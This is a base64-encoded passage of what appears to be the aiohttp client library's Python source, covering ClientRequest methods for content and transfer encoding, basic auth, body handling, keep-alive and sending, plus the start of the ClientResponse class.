IFByZXNlcnZlIGNvZGVkX3ZhbHVlXHJcbiAgICAgICAgICAgICAgICBtcnNsX3ZhbCA9IHZhbHVlLmdldCh2YWx1ZS5rZXksIE1vcnNlbCgpKVxyXG4gICAgICAgICAgICAgICAgbXJzbF92YWwuc2V0KHZhbHVlLmtleSwgdmFsdWUudmFsdWUsIHZhbHVlLmNvZGVkX3ZhbHVlKVxyXG4gICAgICAgICAgICAgICAgY1tuYW1lXSA9IG1yc2xfdmFsXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICBjW25hbWVdID0gdmFsdWUgICMgdHlwZTogaWdub3JlW2Fzc2lnbm1lbnRdXHJcblxyXG4gICAgICAgIHNlbGYuaGVhZGVyc1toZHJzLkNPT0tJRV0gPSBjLm91dHB1dChoZWFkZXI9IiIsIHNlcD0iOyIpLnN0cmlwKClcclxuXHJcbiAgICBkZWYgdXBkYXRlX2NvbnRlbnRfZW5jb2Rpbmcoc2VsZiwgZGF0YTogQW55KSAtPiBOb25lOlxyXG4gICAgICAgICIiIlNldCByZXF1ZXN0IGNvbnRlbnQgZW5jb2RpbmcuIiIiXHJcbiAgICAgICAgaWYgZGF0YSBpcyBOb25lOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgZW5jID0gc2VsZi5oZWFkZXJzLmdldChoZHJzLkNPTlRFTlRfRU5DT0RJTkcsICIiKS5sb3dlcigpXHJcbiAgICAgICAgaWYgZW5jOlxyXG4gICAgICAgICAgICBpZiBzZWxmLmNvbXByZXNzOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiY29tcHJlc3MgY2FuIG5vdCBiZSBzZXQgIiAiaWYgQ29udGVudC1FbmNvZGluZyBoZWFkZXIgaXMgc2V0IlxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgIGVsaWYgc2VsZi5jb21wcmVzczpcclxuICAgICAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uoc2VsZi5jb21wcmVzcywgc3RyKTpcclxuICAgICAgICAgICAgICAgIHNlbGYuY29tcHJlc3MgPSAiZGVmbGF0ZSJcclxuICAgICAgICAgICAgc2VsZi5oZWFkZXJzW2hkcnMuQ09OVEVOVF9FTkNPRElOR10gPSBzZWxmLmNvbXByZXNzXHJcbiAgICAgICAgICAgIHNlbGYuY2h1bmtlZCA9IFRydWUgICMgZW5hYmxlIGNodW5rZWQsIG5vIG5lZWQgdG8gZGVhbCB3aXRoIGxlbmd0aFxyXG5cclxuICAgIGRlZiB1cGRhdGVfdHJhbnNmZXJfZW5jb2Rpbmcoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICAiIiJBbmFseXplIHRyYW5zZmVyLWVuY29kaW5nIGhlYWRlci4iIiJcclxuICAgICAgICB0ZSA9IHNlbGYuaGVhZGVycy5nZXQoaGRycy5UUkFOU0ZFUl9FTkNPRElORywgIiIpLmxvd2VyKClcclxuXHJcbiAgICAgICAgaWYgImNodW5rZWQiIGluIHRlOlxyXG4gICAgICAgICAgICBpZiBzZWxmLmNodW5rZWQ6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICJjaHVua2VkIGNhbiBub3QgYmUgc2V0ICJcclxuICAgICAgICAgICAgICAgICAgICBcJ2lmICJUcmFuc2Zlci1FbmNvZGluZzogY2h1bmtlZCIgaGVhZGVyIGlzIHNldFwnXHJcbiAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgIGVsaWYgc2VsZi5jaHVua2VkOlxyXG4gICAgICAgICAgICBpZiBoZHJzLkNPTlRFTlRfTEVOR1RIIGluIHNlbGYuaGVhZGVyczpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgImNodW5rZWQgY2FuIG5vdCBiZSBzZXQgIiAiaWYgQ29udGVudC1MZW5ndGggaGVhZGVyIGlzIHNldCJcclxuICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgICAgIHNlbGYuaGVhZGVyc1toZHJzLlRSQU5TRkVSX0VOQ09ESU5HXSA9ICJjaHVua2VkIlxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIGlmIGhkcnMuQ09OVEVOVF9MRU5HVEggbm90IGluIHNlbGYuaGVhZGVyczpcclxuICAgICAgICAgICAgICAgIHNlbGYuaGVhZGVyc1toZHJzLkNPTlRFTlRfTEVOR1RIXSA9IHN0cihsZW4oc2VsZi5ib2R5KSlcclxuXHJcbiAgICBkZWYgdXBkYXRlX2F1dGgoc2VsZiwgYXV0aDogT3B0aW9uYWxbQmFzaWNBdXRoXSkgLT4gTm9uZTpcclxuICAgICAgICAiIiJTZXQgYmFzaWMgYXV0aC4iIiJcclxuICAgICAgICBpZiBhdXRoIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGF1dGggPSBzZWxmLmF1dGhcclxuICAgICAgICBpZiBhdXRoIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShhdXRoLCBoZWxwZXJzLkJhc2ljQXV0aCk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiQmFzaWNBdXRoKCkgdHVwbGUgaXMgcmVxdWlyZWQgaW5zdGVhZCIpXHJcblxyXG4gICAgICAgIHNlbGYuaGVhZGVyc1toZHJzLkFVVEhPUklaQVRJT05dID0gYXV0aC5lbmNvZGUoKVxyXG5cclxuICAgIGRlZiB1cGRhdGVfYm9keV9mcm9tX2RhdGEoc2VsZiwgYm9keTogQW55KSAtPiBOb25lOlxyXG4gICAgICAgIGlmIGJvZHkgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgICMgRm9ybURhdGFcclxuICAgICAgICBpZiBpc2luc3RhbmNlKGJvZHksIEZvcm1EYXRhKTpcclxuICAgICAgICAgICAgYm9keSA9IGJvZHkoKVxyXG5cclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGJvZHkgPSBwYXlsb2FkLlBBWUxPQURfUkVHSVNUUlkuZ2V0KGJvZHksIGRpc3Bvc2l0aW9uPU5vbmUpXHJcbiAgICAgICAgZXhjZXB0IHBheWxvYWQuTG9va3VwRXJyb3I6XHJcbiAgICAgICAgICAgIGJvZHkgPSBGb3JtRGF0YShib2R5KSgpXHJcblxyXG4gICAgICAgIHNlbGYuYm9keSA9IGJvZHlcclxuXHJcbiAgICAgICAgIyBlbmFibGUgY2h1bmtlZCBlbmNvZGluZyBpZiBuZWVkZWRcclxuICAgICAgICBpZiBub3Qgc2VsZi5jaHVua2VkOlxyXG4gICAgICAgICAgICBpZiBoZHJzLkNPTlRFTlRfTEVOR1RIIG5vdCBpbiBzZWxmLmhlYWRlcnM6XHJcbiAgICAgICAgICAgICAgICBzaXplID0gYm9keS5zaXplXHJcbiAgICAgICAgICAgICAgICBpZiBzaXplIGlzIE5vbmU6XHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5jaHVua2VkID0gVHJ1ZVxyXG4gICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICBpZiBoZHJzLkNPTlRFTlRfTEVOR1RIIG5vdCBpbiBzZWxmLmhlYWRlcnM6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuaGVhZGVyc1toZHJzLkNPTlRFTlRfTEVOR1RIXSA9IHN0cihzaXplKVxyXG5cclxuICAgICAgICAjIGNvcHkgcGF5bG9hZCBoZWFkZXJzXHJcbiAgICAgICAgYXNzZXJ0IGJvZHkuaGVhZGVyc1xyXG4gICAgICAgIGZvciAoa2V5LCB2YWx1ZSkgaW4gYm9keS5oZWFkZXJzLml0ZW1zKCk6XHJcbiAgICAgICAgICAgIGlmIGtleSBpbiBzZWxmLmhlYWRlcnM6XHJcbiAgICAgICAgICAgICAgICBjb250aW51ZVxyXG4gICAgICAgICAgICBpZiBrZXkgaW4gc2VsZi5za2lwX2F1dG9faGVhZGVyczpcclxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgIHNlbGYuaGVhZGVyc1trZXldID0gdmFsdWVcclxuXHJcbiAgICBkZWYgdXBkYXRlX2V4cGVjdF9jb250aW51ZShzZWxmLCBleHBlY3Q6IGJvb2wgPSBGYWxzZSkgLT4gTm9uZTpcclxuICAgICAgICBpZiBleHBlY3Q6XHJcbiAgICAgICAgICAgIHNlbGYuaGVhZGVyc1toZHJzLkVYUEVDVF0gPSAiMTAwLWNvbnRpbnVlIlxyXG4gICAgICAgIGVsaWYgc2VsZi5oZWFkZXJzLmdldChoZHJzLkVYUEVDVCwgIiIpLmxvd2VyKCkgPT0gIjEwMC1jb250aW51ZSI6XHJcbiAgICAgICAgICAgIGV4cGVjdCA9IFRydWVcclxuXHJcbiAgICAgICAgaWYgZXhwZWN0OlxyXG4gICAgICAgICAgICBzZWxmLl9jb250aW51ZSA9IHNlbGYubG9vcC5jcmVhdGVfZnV0dXJlKClcclxuXHJcbiAgICBkZWYgdXBkYXRlX3Byb3h5KFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgcHJveHk6IE9wdGlvbmFsW1VSTF0sXHJcbiAgICAgICAgcHJveHlfYXV0aDogT3B0aW9uYWxbQmFzaWNBdXRoXSxcclxuICAgICAgICBwcm94eV9oZWFkZXJzOiBPcHRpb25hbFtMb29zZUhlYWRlcnNdLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIHByb3h5X2F1dGggYW5kIG5vdCBpc2luc3RhbmNlKHByb3h5X2F1dGgsIGhlbHBlcnMuQmFzaWNBdXRoKTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigicHJveHlfYXV0aCBtdXN0IGJlIE5vbmUgb3IgQmFzaWNBdXRoKCkgdHVwbGUiKVxyXG4gICAgICAgIHNlbGYucHJveHkgPSBwcm94eVxyXG4gICAgICAgIHNlbGYucHJveHlfYXV0aCA9IHByb3h5X2F1dGhcclxuICAgICAgICBzZWxmLnByb3h5X2hlYWRlcnMgPSBwcm94eV9oZWFkZXJzXHJcblxyXG4gICAgZGVmIGtlZXBfYWxpdmUoc2VsZikgLT4gYm9vbDpcclxuICAgICAgICBpZiBzZWxmLnZlcnNpb24gPCBIdHRwVmVyc2lvbjEwOlxyXG4gICAgICAgICAgICAjIGtlZXAgYWxpdmUgbm90IHN1cHBvcnRlZCBhdCBhbGxcclxuICAgICAgICAgICAgcmV0dXJuIEZhbHNlXHJcbiAgICAgICAgaWYgc2VsZi52ZXJzaW9uID09IEh0dHBWZXJzaW9uMTA6XHJcbiAgICAgICAgICAgIGlmIHNlbGYuaGVhZGVycy5nZXQoaGRycy5DT05ORUNUSU9OKSA9PSAia2VlcC1hbGl2ZSI6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZVxyXG4gICAgICAgICAgICBlbHNlOiAgIyBubyBoZWFkZXJzIG1lYW5zIHdlIGNsb3NlIGZvciBIdHRwIDEuMFxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIEZhbHNlXHJcbiAgICAgICAgZWxpZiBzZWxmLmhlYWRlcnMuZ2V0KGhkcnMuQ09OTkVDVElPTikgPT0gImNsb3NlIjpcclxuICAgICAgICAgICAgcmV0dXJuIEZhbHNlXHJcblxyXG4gICAgICAgIHJldHVybiBUcnVlXHJcblxyXG4gICAgYXN5bmMgZGVmIHdyaXRlX2J5dGVzKFxyXG4gICAgICAgIHNlbGYsIHdyaXRlcjogQWJzdHJhY3RTdHJlYW1Xcml0ZXIsIGNvbm46ICJDb25uZWN0aW9uIlxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgICIiIlN1cHBvcnQgY29yb3V0aW5lcyB0aGF0IHlpZWxkcyBieXRlcyBvYmplY3RzLiIiIlxyXG4gICAgICAgICMgMTAwIHJlc3BvbnNlXHJcbiAgICAgICAgaWYgc2VsZi5fY29udGludWUgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGF3YWl0IHdyaXRlci5kcmFpbigpXHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuX2NvbnRpbnVlXHJcblxyXG4gICAgICAgIHByb3RvY29sID0gY29ubi5wcm90b2NvbFxyXG4gICAgICAgIGFzc2VydCBwcm90b2NvbCBpcyBub3QgTm9uZVxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgaWYgaXNpbnN0YW5jZShzZWxmLmJvZHksIHBheWxvYWQuUGF5bG9hZCk6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmJvZHkud3JpdGUod3JpdGVyKVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgaWYgaXNpbnN0YW5jZShzZWxmLmJvZHksIChieXRlcywgYnl0ZWFycmF5KSk6XHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5ib2R5ID0gKHNlbGYuYm9keSwpICAjIHR5cGU6IGlnbm9yZVthc3NpZ25tZW50XVxyXG5cclxuICAgICAgICAgICAgICAgIGZvciBjaHVuayBpbiBzZWxmLmJvZHk6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgd3JpdGVyLndyaXRlKGNodW5rKSAgIyB0eXBlOiBpZ25vcmVbYXJnLXR5cGVdXHJcblxyXG4gICAgICAgICAgICBhd2FpdCB3cml0ZXIud3JpdGVfZW9mKClcclxuICAgICAgICBleGNlcHQgT1NFcnJvciBhcyBleGM6XHJcbiAgICAgICAgICAgIG5ld19leGMgPSBDbGllbnRPU0Vycm9yKFxyXG4gICAgICAgICAgICAgICAgZXhjLmVycm5vLCAiQ2FuIG5vdCB3cml0ZSByZXF1ZXN0IGJvZHkgZm9yICVzIiAlIHNlbGYudXJsXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICAgICAgbmV3X2V4Yy5fX2NvbnRleHRfXyA9IGV4Y1xyXG4gICAgICAgICAgICBuZXdfZXhjLl9fY2F1c2VfXyA9IGV4Y1xyXG4gICAgICAgICAgICBwcm90b2NvbC5zZXRfZXhjZXB0aW9uKG5ld19leGMpXHJcbiAgICAgICAgZXhjZXB0IGFzeW5jaW8uQ2FuY2VsbGVkRXJyb3IgYXMgZXhjOlxyXG4gICAgICAgICAgICBpZiBub3QgY29ubi5jbG9zZWQ6XHJcbiAgICAgICAgICAgICAgICBwcm90b2NvbC5zZXRfZXhjZXB0aW9uKGV4YylcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGV4YzpcclxuICAgICAgICAgICAgcHJvdG9jb2wuc2V0X2V4Y2VwdGlvbihleGMpXHJcbiAgICAgICAgZmluYWxseTpcclxuICAgICAgICAgICAgc2VsZi5fd3JpdGVyID0gTm9uZVxyXG5cclxuICAgIGFzeW5jIGRlZiBzZW5kKHNlbGYsIGNvbm46ICJDb25uZWN0aW9uIikgLT4gIkNsaWVudFJlc3BvbnNlIjpcclxuICAgICAgICAjIFNwZWNpZnkgcmVxdWVzdCB0YXJnZXQ6XHJcbiAgICAgICAgIyAtIENPTk5FQ1QgcmVxdWVzdCBtdXN0IHNlbmQgYXV0aG9yaXR5IGZvcm0gVVJJXHJcbiAgICAgICAgIyAtIG5vdCBDT05ORUNUIHByb3h5IG11c3Qgc2VuZCBhYnNvbHV0ZSBmb3JtIFVSSVxyXG4gICAgICAgICMgLSBtb3N0IGNvbW1vbiBpcyBvcmlnaW4gZm9ybSBVUklcclxuICAgICAgICBpZiBzZWxmLm1ldGhvZCA9PSBoZHJzLk1FVEhfQ09OTkVDVDpcclxuICAgICAgICAgICAgY29ubmVjdF9ob3N0ID0gc2VsZi51cmwucmF3X2hvc3RcclxuICAgICAgICAgICAgYXNzZXJ0IGNvbm5lY3RfaG9zdCBpcyBub3QgTm9uZVxyXG4gICAgICAgICAgICBpZiBoZWxwZXJzLmlzX2lwdjZfYWRkcmVzcyhjb25uZWN0X2hvc3QpOlxyXG4gICAgICAgICAgICAgICAgY29ubmVjdF9ob3N0ID0gZiJbe2Nvbm5lY3RfaG9zdH1dIlxyXG4gICAgICAgICAgICBwYXRoID0gZiJ7Y29ubmVjdF9ob3N0fTp7c2VsZi51cmwucG9ydH0iXHJcbiAgICAgICAgZWxpZiBzZWxmLnByb3h5IGFuZCBub3Qgc2VsZi5pc19zc2woKTpcclxuICAgICAgICAgICAgcGF0aCA9IHN0cihzZWxmLnVybClcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBwYXRoID0gc2VsZi51cmwucmF3X3BhdGhcclxuICAgICAgICAgICAgaWYgc2VsZi51cmwucmF3X3F1ZXJ5X3N0cmluZzpcclxuICAgICAgICAgICAgICAgIHBhdGggKz0gIj8iICsgc2VsZi51cmwucmF3X3F1ZXJ5X3N0cmluZ1xyXG5cclxuICAgICAgICBwcm90b2NvbCA9IGNvbm4ucHJvdG9jb2xcclxuICAgICAgICBhc3NlcnQgcHJvdG9jb2wgaXMgbm90IE5vbmVcclxuICAgICAgICB3cml0ZXIgPSBTdHJlYW1Xcml0ZXIoXHJcbiAgICAgICAgICAgIHByb3RvY29sLFxyXG4gICAgICAgICAgICBzZWxmLmxvb3AsXHJcbiAgICAgICAgICAgIG9uX2NodW5rX3NlbnQ9ZnVuY3Rvb2xzLnBhcnRpYWwoXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9vbl9jaHVua19yZXF1ZXN0X3NlbnQsIHNlbGYubWV0aG9kLCBzZWxmLnVybFxyXG4gICAgICAgICAgICApLFxyXG4gICAgICAgICAgICBvbl9oZWFkZXJzX3NlbnQ9ZnVuY3Rvb2xzLnBhcnRpYWwoXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9vbl9oZWFkZXJzX3JlcXVlc3Rfc2VudCwgc2VsZi5tZXRob2QsIHNlbGYudXJsXHJcbiAgICAgICAgICAgICksXHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICBpZiBzZWxmLmNvbXByZXNzOlxyXG4gICAgICAgICAgICB3cml0ZXIuZW5hYmxlX2NvbXByZXNzaW9uKHNlbGYuY29tcHJlc3MpXHJcblxyXG4gICAgICAgIGlmIHNlbGYuY2h1bmtlZCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgd3JpdGVyLmVuYWJsZV9jaHVua2luZygpXHJcblxyXG4gICAgICAgICMgc2V0IGRlZmF1bHQgY29udGVudC10eXBlXHJcbiAgICAgICAgaWYgKFxyXG4gICAgICAgICAgICBzZWxmLm1ldGhvZCBpbiBzZWxmLlBPU1RfTUVUSE9EU1xyXG4gICAgICAgICAgICBhbmQgaGRycy5DT05URU5UX1RZUEUgbm90IGluIHNlbGYuc2tpcF9hdXRvX2hlYWRlcnNcclxuICAgICAgICAgICAgYW5kIGhkcnMuQ09OVEVOVF9UWVBFIG5vdCBpbiBzZWxmLmhlYWRlcnNcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICBzZWxmLmhlYWRlcnNbaGRycy5DT05URU5UX1RZUEVdID0gImFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSJcclxuXHJcbiAgICAgICAgIyBzZXQgdGhlIGNvbm5lY3Rpb24gaGVhZGVyXHJcbiAgICAgICAgY29ubmVjdGlvbiA9IHNlbGYuaGVhZGVycy5nZXQoaGRycy5DT05ORUNUSU9OKVxyXG4gICAgICAgIGlmIG5vdCBjb25uZWN0aW9uOlxyXG4gICAgICAgICAgICBpZiBzZWxmLmtlZXBfYWxpdmUoKTpcclxuICAgICAgICAgICAgICAgIGlmIHNlbGYudmVyc2lvbiA9PSBIdHRwVmVyc2lvbjEwOlxyXG4gICAgICAgICAgICAgICAgICAgIGNvbm5lY3Rpb24gPSAia2VlcC1hbGl2ZSJcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIGlmIHNlbGYudmVyc2lvbiA9PSBIdHRwVmVyc2lvbjExOlxyXG4gICAgICAgICAgICAgICAgICAgIGNvbm5lY3Rpb24gPSAiY2xvc2UiXHJcblxyXG4gICAgICAgIGlmIGNvbm5lY3Rpb24gaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuaGVhZGVyc1toZHJzLkNPTk5FQ1RJT05dID0gY29ubmVjdGlvblxyXG5cclxuICAgICAgICAjIHN0YXR1cyArIGhlYWRlcnNcclxuICAgICAgICBzdGF0dXNfbGluZSA9ICJ7MH0gezF9IEhUVFAvezJbMF19LnsyWzFdfSIuZm9ybWF0KFxyXG4gICAgICAgICAgICBzZWxmLm1ldGhvZCwgcGF0aCwgc2VsZi52ZXJzaW9uXHJcbiAgICAgICAgKVxyXG4gICAgICAgIGF3YWl0IHdyaXRlci53cml0ZV9oZWFkZXJzKHN0YXR1c19saW5lLCBzZWxmLmhlYWRlcnMpXHJcblxyXG4gICAgICAgIHNlbGYuX3dyaXRlciA9IHNlbGYubG9vcC5jcmVhdGVfdGFzayhzZWxmLndyaXRlX2J5dGVzKHdyaXRlciwgY29ubikpXHJcblxyXG4gICAgICAgIHJlc3BvbnNlX2NsYXNzID0gc2VsZi5yZXNwb25zZV9jbGFzc1xyXG4gICAgICAgIGFzc2VydCByZXNwb25zZV9jbGFzcyBpcyBub3QgTm9uZVxyXG4gICAgICAgIHNlbGYucmVzcG9uc2UgPSByZXNwb25zZV9jbGFzcyhcclxuICAgICAgICAgICAgc2VsZi5tZXRob2QsXHJcbiAgICAgICAgICAgIHNlbGYub3JpZ2luYWxfdXJsLFxyXG4gICAgICAgICAgICB3cml0ZXI9c2VsZi5fd3JpdGVyLFxyXG4gICAgICAgICAgICBjb250aW51ZTEwMD1zZWxmLl9jb250aW51ZSxcclxuICAgICAgICAgICAgdGltZXI9c2VsZi5fdGltZXIsXHJcbiAgICAgICAgICAgIHJlcXVlc3RfaW5mbz1zZWxmLnJlcXVlc3RfaW5mbyxcclxuICAgICAgICAgICAgdHJhY2VzPXNlbGYuX3RyYWNlcyxcclxuICAgICAgICAgICAgbG9vcD1zZWxmLmxvb3AsXHJcbiAgICAgICAgICAgIHNlc3Npb249c2VsZi5fc2Vzc2lvbixcclxuICAgICAgICApXHJcbiAgICAgICAgcmV0dXJuIHNlbGYucmVzcG9uc2VcclxuXHJcbiAgICBhc3luYyBkZWYgY2xvc2Uoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBpZiBzZWxmLl93cml0ZXIgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuX3dyaXRlclxyXG4gICAgICAgICAgICBmaW5hbGx5OlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fd3JpdGVyID0gTm9uZVxyXG5cclxuICAgIGRlZiB0ZXJtaW5hdGUoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBpZiBzZWxmLl93cml0ZXIgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGlmIG5vdCBzZWxmLmxvb3AuaXNfY2xvc2VkKCk6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl93cml0ZXIuY2FuY2VsKClcclxuICAgICAgICAgICAgc2VsZi5fd3JpdGVyID0gTm9uZVxyXG5cclxuICAgIGFzeW5jIGRlZiBfb25fY2h1bmtfcmVxdWVzdF9zZW50KHNlbGYsIG1ldGhvZDogc3RyLCB1cmw6IFVSTCwgY2h1bms6IGJ5dGVzKSAtPiBOb25lOlxyXG4gICAgICAgIGZvciB0cmFjZSBpbiBzZWxmLl90cmFjZXM6XHJcbiAgICAgICAgICAgIGF3YWl0IHRyYWNlLnNlbmRfcmVxdWVzdF9jaHVua19zZW50KG1ldGhvZCwgdXJsLCBjaHVuaylcclxuXHJcbiAgICBhc3luYyBkZWYgX29uX2hlYWRlcnNfcmVxdWVzdF9zZW50KFxyXG4gICAgICAgIHNlbGYsIG1ldGhvZDogc3RyLCB1cmw6IFVSTCwgaGVhZGVyczogIkNJTXVsdGlEaWN0W3N0cl0iXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgZm9yIHRyYWNlIGluIHNlbGYuX3RyYWNlczpcclxuICAgICAgICAgICAgYXdhaXQgdHJhY2Uuc2VuZF9yZXF1ZXN0X2hlYWRlcnMobWV0aG9kLCB1cmwsIGhlYWRlcnMpXHJcblxyXG5cclxuY2xhc3MgQ2xpZW50UmVzcG9uc2UoSGVhZGVyc01peGluKTpcclxuXHJcbiAgICAjIGZyb20gdGhlIFN0YXR1cy1MaW5lIG9mIHRoZSByZXNwb25zZVxyXG4gICAgdmVyc2lvbiA9IE5vbmUgICMgSFRUUC1WZXJzaW9uXHJcbiAgICBzdGF0dXMgPSBOb25lICAjIHR5cGU6IGludCAgIyBTdGF0dXMtQ29kZVxyXG4gICAgcmVhc29uID0gTm9uZSAgIyBSZWFzb24tUGhyYXNlXHJcblxyXG4gICAgY29udGVudCA9IE5vbmUgICMgdHlwZTogU3RyZWFtUmVhZGVyICAjIFBheWxvYWQgc3RyZWFtXHJcbiAgICBfaGVhZGVycyA9IE5vbmUgICMgdHlwZTogQ0lNdWx0aURpY3RQcm94eVtzdHJdICAjIFJlc3BvbnNlIGhlYWRlcnNcclxuICAgIF9yYXdfaGVhZGVycyA9IE5vbmUgICMgdHlwZTogUmF3SGVhZGVycyAgIyBSZXNwb25zZSByYXcgaGVhZGVyc1xyXG5cclxuICAgIF9jb25uZWN0aW9uID0gTm9uZSAgIyBjdXJyZW50IGNvbm5lY3Rpb25cclxuICAgIF9zb3VyY2VfdHJhY2ViYWNrID0gTm9uZVxyXG4gICAgIyBzZXR0ZWQgdXAgYnkgQ2xpZW50UmVxdWVzdCBhZnRlciBDbGllbnRSZXNwb25zZSBvYmplY3QgY3JlYXRpb25cclxuICAgICMgcG9zdC1pbml0IHN0YWdlIGFsbG93cyB0byBub3QgY2hhbmdlIGN0b3Igc2lnbmF0dXJlXHJcbiAgICBfY2xvc2VkID0gVHJ1ZSAgIyB0byBhbGxvdyBfX2RlbF9fIGZvciBub24taW5pdGlhbGl6ZWQgcHJvcGVybHkgcmVzcG9uc2VcclxuICAgIF9yZWxlYXNlZCA9IEZhbHNlXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgbWV0aG9kOiBzdHIsXHJcbiAgICAgICAgdXJsOiBVUkwsXHJcbiAgICAgICAgKixcclxuICAgICAgICB3cml0ZXI6ICJhc3luY2lvLlRhc2tbTm9uZV0iLFxyXG4gICAgICAgIGNvbnRpbnVlMTAwOiBPcHRpb25hbFsiYXN5bmNpby5GdXR1cmVbYm9vbF0iXSxcclxuICAgICAgICB0aW1lcjogQmFzZVRpbWVyQ29udGV4dCxcclxuICAgICAgICByZXF1ZXN0X2luZm86IFJlcXVlc3RJbmZvLFxyXG4gICAgICAgIHRyYWNlczogTGlzdFsiVHJhY2UiXSxcclxuICAgICAgICBsb29wOiBhc3luY2lvLkFic3RyYWN0RXZlbnRMb29wLFxyXG4gICAgICAgIHNlc3Npb246ICJDbGllbnRTZXNzaW9uIixcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBhc3NlcnQgaXNpbnN0YW5jZSh1cmwsIFVSTClcclxuXHJcbiAgICAgICAgc2VsZi5tZXRob2QgPSBtZXRob2RcclxuICAgICAgICBzZWxmLmNvb2tpZXMgPSBTaW1wbGVDb29raWUoKSAgIyB0eXBlOiBTaW1wbGVDb29raWVbc3RyXVxyXG5cclxuICAgICAgICBzZWxmLl9yZWFsX3VybCA9IHVybFxyXG4gICAgICAgIHNlbGYuX3VybCA9IHVybC53aXRoX2ZyYWdtZW50KE5vbmUpXHJcbiAgICAgICAgc2VsZi5fYm9keSA9IE5vbmUgICMgdHlwZTogQW55XHJcbiAgICAgICAgc2VsZi5fd3JpdGVyID0gd3JpdGVyICAjIHR5cGU6IE9wdGlvbmFsW2FzeW5jaW8uVGFza1tOb25lXV1cclxuICAgICAgICBzZWxmLl9jb250aW51ZSA9IGNvbnRpbnVlMTAwICAjIE5vbmUgYnkgZGVmYXVsdFxyXG4gICAgICAgIHNlbGYuX2Nsb3NlZCA9IFRydWVcclxuICAgICAgICBzZWxmLl9oaXN0b3J5ID0gKCkgICMgdHlwZTogVHVwbGVbQ2xpZW50UmVzcG9uc2UsIC4uLl1cclxuICAgICAgICBzZWxmLl9yZXF1ZXN0X2luZm8gPSByZXF1ZXN0X2luZm9cclxuICAgICAgICBzZWxmLl90aW1lciA9IHRpbWVyIGlmIHRpbWVyIGlzIG5vdCBOb25lIGVsc2UgVGltZXJOb29wKClcclxuICAgICAgICBzZWxmLl9jYWNoZSA9IHt9ICAjIHR5cGU6IERpY3Rbc3RyLCBBbnldXHJcbiAgICAgICAgc2VsZi5fdHJhY2VzID0gdHJhY2VzXHJcbiAgICAgICAgc2VsZi5fbG9vcCA9IGxvb3BcclxuICAgICAgICAjIHN0b3JlIGEgcmVmZXJlbmNlIHRvIHNlc3Npb24gIzE5ODVcclxuICAgICAgICBzZWxmLl9zZXNzaW9uID0gc2Vzc2lvbiAgIyB0eXBlOiBPcHRpb25hbFtDbGllbnRTZXNzaW9uXVxyXG4gICAgICAgIGlmIGxvb3AuZ2V0X2RlYnVnKCk6XHJcbiAgICAgICAgICAgIHNlbGYuX3NvdXJjZV90cmFjZWJhY2sgPSB0cmFjZWJhY2suZXh0cmFjdF9zdGFjayhzeXMuX2dldGZyYW1lKDEpKVxyXG5cclxuICAgIEByZWlmeVxyXG4gICAgZGVmIHVybChzZWxmKSAtPiBVUkw6XHJc